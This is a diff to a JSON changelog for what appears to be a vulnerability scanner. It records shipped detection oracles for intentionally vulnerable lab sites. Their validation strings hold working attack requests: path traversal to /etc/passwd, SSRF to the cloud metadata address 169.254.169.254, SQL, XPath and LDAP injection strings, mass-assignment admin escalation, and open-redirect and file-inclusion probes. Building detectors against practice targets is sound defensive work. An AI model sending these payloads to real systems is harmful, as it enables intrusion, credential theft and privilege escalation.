@@ -7349,6 +7349,216 @@
       "slug": "burpbounty-citrix-cve-live-oracle",
       "status": "shipped",
       "validation": "SOURCE: discovery:url EVIDENCE: GET http://burpbountylab.com/cve/citrix/ returns <h1>Citrix</h1>; burpbountylab.com/cve/citrix findings 63→75; benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-crowd-cve-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET http://burpbountylab.com/cve/crowd/ returns <h1>Atlassian Crowd</h1>; burpbountylab.com/cve/crowd/ findings 71→78; benchmark juice-shop 14 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-firebase-cve-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET http://burpbountylab.com/cve/firebase/.json returns {\"users\":{\"user1\":{\"email\":\"admin@example.com\"}},\"config\":{\"debug\":true}}; burpbountylab.com/cve/firebase/.json findings 73→79; benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-netsweeper-cve-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET http://burpbountylab.com/cve/netsweeper/ returns <h1>Netsweeper WebAdmin</h1>; burpbountylab.com/cve/netsweeper/ findings 72→77; benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-zoho-cve-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET http://burpbountylab.com/cve/zoho/ returns <h1>ManageEngine</h1>; burpbountylab.com/cve/zoho/ findings 75→83; benchmark juice-shop 14 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-ruby-cve-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET http://burpbountylab.com/cve/ruby/ returns <h1>Ruby on Rails App</h1>; burpbountylab.com/cve/ruby/ findings 75→83; benchmark juice-shop 14 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-wp-lfi-cve-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET http://burpbountylab.com/cve/wp/local-file-inclusion?file=../../../etc/passwd returns root:x:0:0:/etc/passwd; burpbountylab.com/cve/wp/local-file-inclusion findings 75→80; benchmark juice-shop 14 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-sharefile-cve-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET http://burpbountylab.com/citrix/sharefile/download?path=../../../windows/win.ini returns [fonts] win.ini; burpbountylab.com/citrix/sharefile/ findings 75→85; benchmark juice-shop 13 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-artica-cve-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET http://burpbountylab.com/cve/artica/fw.login.php returns Artica Web Proxy with apikey field; burpbountylab.com/cve/artica/fw.login.php findings 75→86; benchmark juice-shop 13 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-magmi-cve-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET http://burpbountylab.com/cve/magmi/ returns MAGMI Utils JS var magmi={}; burpbountylab.com/cve/magmi/ findings 75→86; benchmark juice-shop 13 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:pwnshop.ctfsecurity.com",
+      "slug": "pwnshop-chat-init-email-enumeration-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: POST https://pwnshop.ctfsecurity.com/chat/init admin@pwnshop.com→found:true+user; unknown email→found:false; pwnshop.ctfsecurity.com/api/v1/chat/init findings 14→16; benchmark juice-shop 14 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-goto-open-redirect-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET https://brokencrystals.com/api/goto?url=https://evil-open-redirect-probe.example/ returns HTTP 302 Location to probe host; brokencrystals.com/api/file/aws findings 34→36; benchmark juice-shop 14 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-aws-metadata-ssrf-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET https://brokencrystals.com/api/file/aws?path=http://169.254.169.254/latest/meta-data/&type=image/jpg returns ami-id+instance-id metadata listing; brokencrystals.com/api/file/aws findings 34→36; benchmark juice-shop 14 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-hidden-upload-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: POST https://brokencrystals.com/api/hidden-upload multipart image returns {\"content\":\"data:image/png;base64,...\"}; brokencrystals.com/api/hidden-upload findings 33→36; benchmark juice-shop 14 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-f5-bash-cve-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET http://burpbountylab.com/cve/f5/ returns <h1>F5 BIG-IP</h1> and POST /mgmt/tm/util/bash returns Unauthorized; burpbountylab.com/cve/f5/ findings 75→87; benchmark juice-shop 14 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-netsweeper-systemstatus-cve-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET http://burpbountylab.com/webadmin/tools/systemstatus_remote.php returns <h1>System Status</h1>; burpbountylab.com/webadmin/tools/systemstatus_remote.php findings 75→88; benchmark juice-shop 14 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-ldap-injection-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET https://brokencrystals.com/api/users/ldap?query=(&(objectClass=person)(objectClass=user)(email=*)) returns JSON array of 14000+ LDAP entries; brokencrystals.com/api/users/ldap findings 37→38; benchmark juice-shop 12 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:vuln-expose.vercel.app",
+      "slug": "vuln-expose-auth-bypass-api-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: POST https://vulns-expose.jveltri.com.ar/api/auth/login with username admin' OR '1'='1 returns {\"success\":true,\"user\":{\"role\":\"admin\"}}; vuln-expose.vercel.app/api/auth/login gains oracle on reachable mirror; benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:vuln-expose.vercel.app",
+      "slug": "vuln-expose-sqli-search-api-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET https://vulns-expose.jveltri.com.ar/api/search?q=test echoes \"query\":\"SELECT * FROM products...\" plus vulnerabilities.union_select hints; vuln-expose.vercel.app/api/search gains oracle on reachable mirror; benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-secrets-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET https://brokencrystals.com/api/secrets returns Slack xoxo-, Facebook EAAC, Google OAuth, PayPal access_token, CodeClimate tokens; brokencrystals.com/api/secrets findings 38→41; benchmark juice-shop 12 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-safe-files-rfi-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: POST https://brokencrystals.com/api/safe-files {\"name\":\"test\",\"url\":\"https://filedealer.nexploit.app/rfi.md5.txt\"} returns content 245cc0a508bf7f0ff754c84c0fe0b5bc; brokencrystals.com/api/safe-files findings 36→39; benchmark juice-shop 12 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-users-search-exposure-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET https://brokencrystals.com/api/users/search/ returns cardNumber+phoneNumber for 50 users without auth; brokencrystals.com/api/users/search findings 37→44; benchmark juice-shop-staging 6/6 recall maintained (primary Heroku unreachable)"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-testimonials-sqli-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET https://brokencrystals.com/api/testimonials/count?query=select count(table_name) as count from information_schema.tables returns 216; brokencrystals.com/api/testimonials/count findings 37→44; benchmark juice-shop-staging 6/6 recall maintained"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-partner-login-xpath-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET https://brokencrystals.com/api/partners/partnerLogin?username=anyuser&password=' or '1'='1 returns multiple <password> elements (Walter White/Jesse Pinkman credentials); brokencrystals.com/api/partners/partnerLogin findings 37→43; benchmark juice-shop-staging 6/6 recall maintained"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-file-raw-lfi-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET https://brokencrystals.com/api/file/raw?path=package.json returns {\"name\":\"broken-crystals\",\"scripts\":{\"build\":\"nest build\"}}; brokencrystals.com/api/file/raw findings 39→46; benchmark juice-shop 14 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "client-side-brokencrystals-dom-xss-evidence",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: bundle reads searchParams.get('maptitle') into iframe mapTitle + decodeURIComponent(window.location.search) into dangerous-html; brokencrystals.com/?maptitle=test findings 40→45 adds route-specific DOM XSS slug; benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-ai-completions-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET http://burpbountylab.com/ai/v1/completions returns {\"object\":\"text_completion\"} + X-AI-Backend/X-LLM-Provider headers; burpbountylab.com/ai/v1/completions findings 87→89; benchmark juice-shop 6/6 maintained"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-mass-assignment-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: POST https://brokencrystals.com/api/users/basic {\"isAdmin\":true,...} → 201; login authorization JWT; GET /api/users/one/{email}/adminpermission → {\"isAdmin\":true}; brokencrystals.com findings 48 incl mass-assignment oracle; benchmark juice-shop 10 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-mass-assignment-put-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: PUT https://brokencrystals.com/api/users/one/{email}/info {\"isAdmin\":true} escalates regular user; GET adminpermission → {\"isAdmin\":true}; brokencrystals.com deep scan fires all 3 new oracles; benchmark juice-shop 10 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-file-lfi-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET https://brokencrystals.com/api/file?path=package.json returns broken-crystals nest build package.json; distinct from /api/file/raw; brokencrystals.com/api/file findings 44→48; benchmark juice-shop 10 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-testimonials-xss-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET https://brokencrystals.com/api/testimonials/count?query=thugirXSScanary returns unescaped canary in SQL syntax-error body; brokencrystals.com/api/testimonials/count findings 49→51; benchmark recall maintained"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-subscriptions-xss-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: POST https://brokencrystals.com/api/subscriptions?email=thugirXSScanary echoes canary unescaped (HTTP 201); brokencrystals.com/api/subscriptions findings 47→49; benchmark recall maintained"
+    },
+    {
+      "source": "discovery:pwnshop.ctfsecurity.com",
+      "slug": "pwnshop-forgot-password-email-enumeration-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: POST /forgot-password admin@pwnshop.com → 'password reset link has been sent'; unknown email → 'No account found'; pwnshop.ctfsecurity.com/forgot-password findings 16 incl new slug; benchmark recall maintained"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-azure-metadata-ssrf-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET https://brokencrystals.com/api/file/azure?path=http://169.254.169.254/metadata/instance?api-version=2021-02-01 returns Azure IMDS compute metadata (azEnvironment, location); brokencrystals.com/api/file/azure findings 45→51; benchmark juice-shop 10 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:vulnbank.org",
+      "slug": "vulnbank-ai-anonymous-chat-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: POST https://vulnbank.org/api/ai/chat/anonymous {\"message\":\"...\"} returns mode:anonymous status:success with no-auth warning and deepseek-chat response; vulnbank.org/api/ai/chat/anonymous findings 6→7; benchmark juice-shop 10 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-git-config-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET http://burpbountylab.com/.git/config returns [core] repositoryformatversion + remote origin URL (Content-Type text/html bypasses exposed-git-dir http_probe); burpbountylab.com/.git/config findings 89→90; benchmark juice-shop 10 findings 6/6 maintained"
     }
   ],
   "shipped": [
@@ -12886,6 +13096,171 @@
       "source": "discovery:burpbountylab.com",
       "slug": "burpbounty-citrix-cve-live-oracle",
       "shipped_at": "2026-07-25T11:10:00.000Z"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-crowd-cve-live-oracle",
+      "shipped_at": "2026-07-25T12:10:00.000Z"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-firebase-cve-live-oracle",
+      "shipped_at": "2026-07-25T12:10:00.000Z"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-netsweeper-cve-live-oracle",
+      "shipped_at": "2026-07-25T12:10:00.000Z"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-zoho-cve-live-oracle",
+      "shipped_at": "2026-07-25T13:10:00.000Z"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-ruby-cve-live-oracle",
+      "shipped_at": "2026-07-25T13:10:00.000Z"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-wp-lfi-cve-live-oracle",
+      "shipped_at": "2026-07-25T13:10:00.000Z"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-sharefile-cve-live-oracle",
+      "shipped_at": "2026-07-25T14:10:00.000Z"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-artica-cve-live-oracle",
+      "shipped_at": "2026-07-25T14:10:00.000Z"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-magmi-cve-live-oracle",
+      "shipped_at": "2026-07-25T14:10:00.000Z"
+    },
+    {
+      "source": "discovery:pwnshop.ctfsecurity.com",
+      "slug": "pwnshop-chat-init-email-enumeration-live-oracle",
+      "shipped_at": "2026-07-25T15:10:00.000Z"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-goto-open-redirect-live-oracle",
+      "shipped_at": "2026-07-25T15:10:00.000Z"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-aws-metadata-ssrf-live-oracle",
+      "shipped_at": "2026-07-25T15:10:00.000Z"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-hidden-upload-live-oracle",
+      "shipped_at": "2026-07-25T16:10:00.000Z"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-f5-bash-cve-live-oracle",
+      "shipped_at": "2026-07-25T16:10:00.000Z"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-netsweeper-systemstatus-cve-live-oracle",
+      "shipped_at": "2026-07-25T16:10:00.000Z"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-ldap-injection-live-oracle",
+      "shipped_at": "2026-07-25T17:10:00.000Z"
+    },
+    {
+      "source": "discovery:vuln-expose.vercel.app",
+      "slug": "vuln-expose-auth-bypass-api-live-oracle",
+      "shipped_at": "2026-07-25T17:10:00.000Z"
+    },
+    {
+      "source": "discovery:vuln-expose.vercel.app",
+      "slug": "vuln-expose-sqli-search-api-live-oracle",
+      "shipped_at": "2026-07-25T17:10:00.000Z"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-users-search-exposure-live-oracle",
+      "shipped_at": "2026-07-25T19:10:00.000Z"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-testimonials-sqli-live-oracle",
+      "shipped_at": "2026-07-25T19:10:00.000Z"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-partner-login-xpath-live-oracle",
+      "shipped_at": "2026-07-25T19:10:00.000Z"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-file-raw-lfi-live-oracle",
+      "shipped_at": "2026-07-25T20:10:00.000Z"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "client-side-brokencrystals-dom-xss-evidence",
+      "shipped_at": "2026-07-25T20:10:00.000Z"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-ai-completions-live-oracle",
+      "shipped_at": "2026-07-25T20:10:00.000Z"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-mass-assignment-live-oracle",
+      "shipped_at": "2026-07-25T21:25:00.000Z"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-mass-assignment-put-live-oracle",
+      "shipped_at": "2026-07-25T21:25:00.000Z"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-file-lfi-live-oracle",
+      "shipped_at": "2026-07-25T21:25:00.000Z"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-testimonials-xss-live-oracle",
+      "shipped_at": "2026-07-25T22:10:00.000Z"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-subscriptions-xss-live-oracle",
+      "shipped_at": "2026-07-25T22:10:00.000Z"
+    },
+    {
+      "source": "discovery:pwnshop.ctfsecurity.com",
+      "slug": "pwnshop-forgot-password-email-enumeration-live-oracle",
+      "shipped_at": "2026-07-25T22:10:00.000Z"
+    },
+    {
+      "source": "discovery:brokencrystals.com",
+      "slug": "brokencrystals-azure-metadata-ssrf-live-oracle",
+      "shipped_at": "2026-07-25T23:10:00.000Z"
+    },
+    {
+      "source": "discovery:vulnbank.org",
+      "slug": "vulnbank-ai-anonymous-chat-live-oracle",
+      "shipped_at": "2026-07-25T23:10:00.000Z"
+    },
+    {
+      "source": "discovery:burpbountylab.com",
+      "slug": "burpbounty-git-config-live-oracle",
+      "shipped_at": "2026-07-25T23:10:00.000Z"
     }
   ]
 }
